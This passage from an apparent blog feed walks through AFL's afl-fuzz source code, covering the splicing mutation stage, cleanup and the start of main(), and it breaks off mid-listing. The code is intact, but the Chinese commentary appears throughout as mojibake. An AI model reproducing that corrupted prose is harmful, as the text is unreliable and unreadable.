class="keyword">if</span> (perf_score &lt;= HAVOC_MAX_MULT * <span class="number">100</span>) &#123;</span><br><span class="line">    stage_max  *= <span class="number">2</span>;</span><br><span class="line">    perf_score *= <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  havoc_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰¾åˆ°æ–°çš„æ‰§è¡Œè·¯å¾„ï¼Œå°±ä¼šå¯¹å‰©ä½™æ‰§è¡Œæ¬¡æ•°ä»¥åŠæ€§èƒ½è¯„åˆ†è¿›è¡Œä¸€ä¸ªç¿»å€ï¼Œå¯¹æœ‰æ•ˆè¾“å…¥æŠ•å…¥æ›´å¤šè®¡ç®—èµ„æº</p><h3 id="SPLICINGå˜å¼‚"><a href="#SPLICINGå˜å¼‚" class="headerlink" title="SPLICINGå˜å¼‚"></a>SPLICINGå˜å¼‚</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (use_splicing &amp;&amp; splice_cycle++ &lt; SPLICE_CYCLES &amp;&amp;</span><br><span class="line">    queued_paths &gt; <span class="number">1</span> &amp;&amp; queue_cur-&gt;len &gt; <span class="number">1</span>) &#123;</span><br></pre></td></tr></table></figure><p>splicingåŠŸèƒ½å¼€å¯ä¸”æ¬¡æ•°é™åˆ¶15æ¬¡ï¼Œé˜Ÿåˆ—ä¸­è‡³å°‘ä¸¤ä¸ªè¾“å…¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Pick a random queue entry and seek to it. Don&#x27;t splice with yourself. */</span></span><br><span class="line"><span class="keyword">do</span> &#123; tid = <span class="built_in">UR</span>(queued_paths); &#125; <span class="keyword">while</span> (tid == current_entry);</span><br><span class="line"></span><br><span class="line">splicing_with = tid;</span><br><span class="line">target = queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tid &gt;= <span class="number">100</span>) &#123; target = target-&gt;next_100; tid -= <span class="number">100</span>; &#125;</span><br><span class="line"><span class="keyword">while</span> (tid--) target = target-&gt;next;</span><br></pre></td></tr></table></figure><p>éšæœºé€‰æ‹©ä¸€ä¸ªé˜Ÿåˆ—ï¼Œä½†ä¸èƒ½æ˜¯ä¸¤ä¸ªç›¸åŒçš„é˜Ÿåˆ—ï¼Œæ¯100ä¸ªé˜Ÿåˆ—è®¾ç½®ä¸€ä¸ªå¿«é€Ÿè®¿é—®ç‚¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (target &amp;&amp; (target-&gt;len &lt; <span class="number">2</span> || target == queue_cur)) &#123;</span><br><span class="line">  target = target-&gt;next;</span><br><span class="line">  splicing_with++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¡®ä¿ç›®æ ‡æ–‡ä»¶é•¿åº¦åˆé€‚ä¸”ä¸æ˜¯è‡ªå·±</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">locate_diffs</span>(in_buf, new_buf, <span class="built_in">MIN</span>(len, target-&gt;len), &amp;f_diff, &amp;l_diff);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">locate_diffs</span><span class="params">(u8* ptr1, u8* ptr2, u32 len, s32* first, s32* last)</span> </span>&#123;</span><br><span class="line">  s32 f_loc = <span class="number">-1</span>;</span><br><span class="line">  s32 l_loc = <span class="number">-1</span>;</span><br><span class="line">  u32 pos;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (pos = <span class="number">0</span>; pos &lt; len; pos++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(ptr1++) != *(ptr2++)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (f_loc == <span class="number">-1</span>) f_loc = pos;</span><br><span class="line">      l_loc = pos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *first = f_loc;</span><br><span class="line">  *last = l_loc;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€å­—èŠ‚æ¯”è¾ƒä¸¤ä¸ªç¼“å†²åŒºï¼Œ<code>f_loc</code>è®°å½•ç¬¬ä¸€ä¸ªä¸åŒå­—èŠ‚çš„ä½ç½®ï¼Œ<code>l_loc</code>è®°å½•æœ€åä¸€ä¸ªä¸åŒå­—èŠ‚çš„ä½ç½®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f_diff &lt; <span class="number">0</span> || l_diff &lt; <span class="number">2</span> || f_diff == l_diff) &#123;</span><br><span class="line">  <span class="built_in">ck_free</span>(new_buf);</span><br><span class="line">  <span class="keyword">goto</span> retry_splicing;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Split somewhere between the first and last differing byte. */</span></span><br><span class="line">split_at = f_diff + <span class="built_in">UR</span>(l_diff - f_diff);</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥ç‚¹çš„é€‰æ‹©ï¼š</p><ul><li><p>å¦‚æœæ–‡ä»¶å®Œå…¨ç›¸åŒ(f_diff &lt; 0)ï¼Œé‡æ–°é€‰æ‹©ç›®æ ‡</p></li><li><p>å¦‚æœå·®å¼‚å¤ªå°(l_diff &lt; 2æˆ–f_diff &#x3D;&#x3D; l_diff)ï¼Œé‡æ–°é€‰æ‹©</p></li><li><p>åœ¨é¦–å°¾å·®å¼‚ä¹‹é—´éšæœºé€‰æ‹©æ‹¼æ¥ç‚¹ï¼Œç¡®ä¿æ‹¼æ¥æœ‰æ„ä¹‰</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Do the thing. */</span></span><br><span class="line">len = target-&gt;len;</span><br><span class="line"><span class="built_in">memcpy</span>(new_buf, in_buf, split_at);</span><br><span class="line">in_buf = new_buf;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ck_free</span>(out_buf);</span><br><span class="line">out_buf = <span class="built_in">ck_alloc_nozero</span>(len);</span><br><span class="line"><span class="built_in">memcpy</span>(out_buf, in_buf, len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> havoc_stage;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥æ“ä½œå¼€å§‹ï¼š</p><ul><li><strong>å‰åŠéƒ¨åˆ†</strong>: å¤åˆ¶å½“å‰è¾“å…¥çš„å‰split_atå­—èŠ‚åˆ°æ–°ç¼“å†²åŒº</li><li><strong>ååŠéƒ¨åˆ†</strong>: ç›®æ ‡æ–‡ä»¶çš„ååŠéƒ¨åˆ†å·²ç»åœ¨new_bufä¸­</li><li><strong>ç¼“å†²åŒºåˆ‡æ¢</strong>: å°†in_bufæŒ‡å‘æ–°çš„æ‹¼æ¥ç»“æœ</li><li><strong>é‡æ–°è¿›å…¥havoc</strong>: å¯¹æ‹¼æ¥ç»“æœè¿›è¡Œéšæœºå˜å¼‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">abandon_entry:</span><br><span class="line"></span><br><span class="line">splicing_with = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Update pending_not_fuzzed count if we made it through the calibration</span></span><br><span class="line"><span class="comment">   cycle and have not seen this entry before. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; !queue_cur-&gt;cal_failed &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">  queue_cur-&gt;was_fuzzed = <span class="number">1</span>;</span><br><span class="line">  pending_not_fuzzed--;</span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;favored) pending_favored--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">munmap</span>(orig_in, queue_cur-&gt;len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_buf != orig_in) <span class="built_in">ck_free</span>(in_buf);</span><br><span class="line"><span class="built_in">ck_free</span>(out_buf);</span><br><span class="line"><span class="built_in">ck_free</span>(eff_map);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br></pre></td></tr></table></figure><p>æœ€åæ¸…ç†èµ„æºå°±èƒ½é€€å‡ºå‡½æ•°äº†</p><h2 id="mainå‡½æ•°å‰©ä½™éƒ¨åˆ†"><a href="#mainå‡½æ•°å‰©ä½™éƒ¨åˆ†" class="headerlink" title="mainå‡½æ•°å‰©ä½™éƒ¨åˆ†"></a>mainå‡½æ•°å‰©ä½™éƒ¨åˆ†</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">    <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ­¥å®ä¾‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">queue_cur = queue_cur-&gt;next;</span><br><span class="line">current_entry++;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If we stopped programmatically, we kill the forkserver and the current runner. </span></span><br><span class="line"><span class="comment">   If we stopped manually, this is done by the signal handler. */</span></span><br><span class="line"><span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">    <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Now that we&#x27;ve killed the forkserver, we wait for it to be able to get rusage stats. */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="built_in">WARNF</span>(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›ç¨‹æ¸…ç†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">write_bitmap</span>();</span><br><span class="line"><span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">save_auto</span>();</span><br></pre></td></tr></table></figure><p>æœ€åç»Ÿè®¡ä¿¡æ¯ä»¥åŠæ•°æ®çš„ä¿å­˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SAYF</span>(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">     stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"><span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">get_cur_time</span>() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line">  <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿è¡Œäº†30minè¿˜åœ¨ç¬¬ä¸€è½®ï¼Œåˆ™æç¤ºç»“æœä¸å®Œæ•´</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fclose</span>(plot_file);</span><br><span class="line"><span class="built_in">destroy_queue</span>();</span><br><span class="line"><span class="built_in">destroy_extras</span>();</span><br><span class="line"><span class="built_in">ck_free</span>(target_path);</span><br><span class="line"><span class="built_in">ck_free</span>(sync_id);</span><br><span class="line"></span><br><span class="line"><span class="built_in">alloc_report</span>();</span><br></pre></td></tr></table></figure><p>èµ„æºé”€æ¯å’Œå†…å­˜æ¸…ç†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">OKF</span>(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>æœ€åä¼˜é›…çš„é€€å‡º</p><blockquote><p>ä¹‹åæˆ‘ä¼šå°è¯•å»ç†è§£ä¸€ä¸ªAFL++ä»¥åŠlibFuzzçš„è®¾è®¡ï¼Œå‰ææ˜¯æˆ‘çœ‹å¾—æ‡‚ğŸ˜ğŸ˜ğŸ¥³</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AFL-fuzzæºç é˜…è¯»&quot;&gt;&lt;a href=&quot;#AFL-fuzzæºç é˜…è¯»&quot; class=&quot;headerlink&quot; title=&quot;AFL-fuzzæºç é˜…è¯»&quot;&gt;&lt;/a&gt;AFL-fuzzæºç é˜…è¯»&lt;/h1&gt;&lt;h2 id=&quot;perform-dry-run-use-argv&quot;</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://s1nec-1o.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>AFLæºç é˜…è¯»ä¹‹afl-fuzz(1)</title>
    <link href="http://s1nec-1o.github.io/2025/08/11/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz-1/"/>
    <id>http://s1nec-1o.github.io/2025/08/11/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-fuzz-1/</id>
    <published>2025-08-11T07:56:05.000Z</published>
    <updated>2025-08-11T07:56:56.701Z</updated>
    
    <content type="html"><![CDATA[<h2 id="afl-fuzzæºç é˜…è¯»"><a href="#afl-fuzzæºç é˜…è¯»" class="headerlink" title="afl-fuzzæºç é˜…è¯»"></a>afl-fuzzæºç é˜…è¯»</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  s32 opt;</span><br><span class="line">  u64 prev_queued = <span class="number">0</span>;</span><br><span class="line">  u32 sync_interval_cnt = <span class="number">0</span>, seek_to;</span><br><span class="line">  u8  *extras_dir = <span class="number">0</span>;</span><br><span class="line">  u8  mem_limit_given = <span class="number">0</span>;</span><br><span class="line">  u8  exit_1 = !!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_BENCH_JUST_ONE&quot;</span>);</span><br><span class="line">  <span class="type">char</span>** use_argv;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timeval</span> tv;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">timezone</span> tz;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  doc_path = <span class="built_in">access</span>(DOC_PATH, F_OK) ? <span class="string">&quot;docs&quot;</span> : DOC_PATH;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line">  <span class="built_in">srandom</span>(tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = 